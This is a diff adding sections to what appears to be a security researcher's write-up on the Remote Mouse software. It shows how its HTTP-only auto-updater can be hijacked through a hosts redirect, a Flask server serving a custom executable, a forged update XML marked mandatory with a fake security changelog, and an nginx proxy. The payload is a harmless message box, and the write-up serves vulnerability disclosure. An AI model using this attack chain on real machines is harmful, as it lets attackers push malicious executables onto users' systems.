@@ -509,4 +509,124 @@ Escape character is '^]'.
 SIN 15win pwd pwd 300^CConnection closed by foreign host.
 ```
 
-Cool, so the `pwd pwd` substring appears when there is a password, otherwise it's `nop nop`.
+Cool, so the `pwd pwd` substring appears when there is a password, otherwise it's `nop nop`. But let's see if there's anyway we can get past the authentication. Oddly enough, I'm having a hard time finding the encryption routine in the binary.
+
+Finally after much more searching, I found the logic that handles password-protected sessions. It's contained in `RemoteMouse.exe` in `Form1.b(object)`. The binary checks if `this.i` is set to true, and if so, sends the `pwd pwd 300` string, otherwise it sends the `nop nop 300` string. Let's see how `this.i` is set: 
+
+## AutoUpdate 
+
+While I was looking for the encryption algorithm, I found the autoupdating subroutine. It looks like updates are checked through this instruction: `AutoUpdater.Start("http://www.remotemouse.net/autoupdater/AutoUpdater.NET_AppCast_RM.xml", null);` But wait a minute, that's HTTP, **not** HTTPS, so that means an attacker could machine-in-middle that URL and potentially deploy a malicious executable to the target machine. 
+
+To test this out, I'll change the `C:\Windows\System32\drivers\etc\hosts` file to point `remotemouse.net` to my Kali VM, then I'll run a Python Flask web server with the following files `/downloads/RemoteMouse.exe` and `/autoupdater/AutoUpdater.NET_AppCast_RM.xml`. Of course, I'll be manually building/creating these files to host my own "malicious" content. The easiest way I can think of to make an executable do something that's noticeable when it executes is a `MessageBox` in Windows. So I created a simple message to pop up and let me know the binary was executed:
+
+```C
+#include <Windows.h>
+#include <stdio.h>
+
+
+int main(void) {
+    SYSTEMTIME st, lt;
+    GetSystemTime(&st);
+    GetLocalTime(&lt);
+
+    char* msgboxTitle = "Custom RemoteMouse.exe Execution";
+    char msgboxMsg[1024];
+    _snprintf_s(msgboxMsg, 1024, 1024, "RemoteMouse.exe executed at %02d/%02d/%02d %02d:%02d:%02d", lt.wMonth, lt.wDay, lt.wYear, lt.wHour, lt.wMinute, lt.wSecond);
+    int msgboxID = MessageBoxA(
+        NULL,
+        msgboxMsg,
+        msgboxTitle,
+        MB_ICONEXCLAMATION
+    );
+	return 0;
+}
+```
+
+and my XML file is only slightly modified. I changed the version to be one minor step higher than what I am currently at:
+
+```xml
+<item>
+    <title>New version 3.0.1.6 is available for Remote Mouse</title>
+    <version>3.0.1.6</version>
+    <url>http://www.remotemouse.net/downloads/RemoteMouse.exe</url>
+    <changelog>http://www.remotemouse.net/autoupdater/releasenotes_rm.html</changelog>
+</item>
+```
+
+Then to spin up the Python Flask web server, I only need a few endpoints:
+
+```python
+import flask
+app = flask.Flask(__name__)
+
+@app.route('/downloads/RemoteMouse.exe')
+def exe():
+    return flask.send_file('RemoteMouse.exe')
+
+@app.route('/autoupdater/AutoUpdater.NET_AppCast_RM.xml')
+def xml():
+    return flask.send_file('AutoUpdater.NET_AppCast_RM.xml')
+
+@app.route('/autoupdater/releasenotes_rm.html')
+def changelog():
+    return '<h1>There was a security vulnerability in the current version, update as soon as possible</h1>'
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=80)
+```
+
+With all of this up and running, let's boot up the server again. Nothing popped up, but if you do a manual update check, the new version comes up. It also contains our scary changelog and custom version number. You can still skip, cancel the update, and unfortunately, when I actually click "Update", it fails to connect to the server. 
+
+![XML V1](imgs/xmlv1.png)
+
+Let's up the version number to something higher and see if we can get the server to pop up an update dialog on start. I tried increasing the major number to `3.2.0.0` and we get a pop up this time on boot. Still the update is skipable...
+
+![XML V2](imgs/xmlv2.png)
+
+
+Let's investigate the binary to see what's going on. Turns out the AutoUpdate functionality uses [AutoUpdater.Net](https://github.com/ravibpatel/AutoUpdater.NET) to parse the XML file that is retrieved. So the function call to `AutoUpdater.Start` is actually calling this library, and this library takes it from here. One line in the README stood out to me, it's describing the required/optional fields in the XML file describing the update when I saw this:
+
+> mandatory (Optional): You can set this to true if you don't want user to skip this version. This will ignore Remind Later and Skip options and hide both Skip and Remind Later button on update dialog.
+
+So if we set the mandatory field in the XML file we can force a user to update? Or at least make it scary enough that they do so? I updated the XML file to:
+
+```xml
+<item>
+    <title>New version 3.2.0.0 is available for Remote Mouse</title>
+    <version>3.2.0.0</version>
+    <url>http://www.remotemouse.net/downloads/RemoteMouse.exe</url>
+    <changelog>http://www.remotemouse.net/autoupdater/releasenotes_rm.html</changelog>
+    <mandatory>true</mandatory>
+</item>
+```
+
+And rebooted the server to see this:
+
+![XML V3](imgs/xmlv3.png)
+
+So we can make it pop up with a mandatory update! Let's see if we can succesfully serve the binary, as well. I think the AutoUpdate.Net library might be a little smarter than the RemoteMouse binary, and force an HTTP connection, so let's spin up an Nginx reverse proxy and redirect 443 traffic to 80. I know this won't successfully MITM someone, because of SSL errors (unless the developers explicitly ignore them...), but let's see what happens. Here are two snippets from a [Gist](https://gist.github.com/jessedearing/2351836) to do this quickly:
+
+```bash
+openssl req -x509 -nodes -days 365 -newkey rsa:1024  -keyout /etc/nginx/ssl/myssl.key  -out /etc/nginx/ssl/myssl.crt
+```
+
+```
+server {
+    listen               443 ssl;
+    ssl_certificate      ssl/myssl.crt;
+    ssl_certificate_key  ssl/myssl.key;
+    server_name remotemouse.net;
+    location / {
+      proxy_set_header        Host $host;
+      proxy_set_header        X-Real-IP $remote_addr;
+      proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
+      proxy_set_header        X-Forwarded-Proto $scheme;
+
+      proxy_pass          http://127.0.0.1:80;
+    }
+}
+```
+
+![MessageBox Success](imgs/custombinary.png)
+
+Let's reboot the server again, and... **SUCCESS**! The auto-updater worked and executed a binary that we served! Though, that's a little odd, the nginx server logs don't show any connections. To double-check, I turned off the nginx reverse-proxy, and ran it again, and it worked. This means we can succesfully MITM a target and serve them a malicious, custom exectuable. 
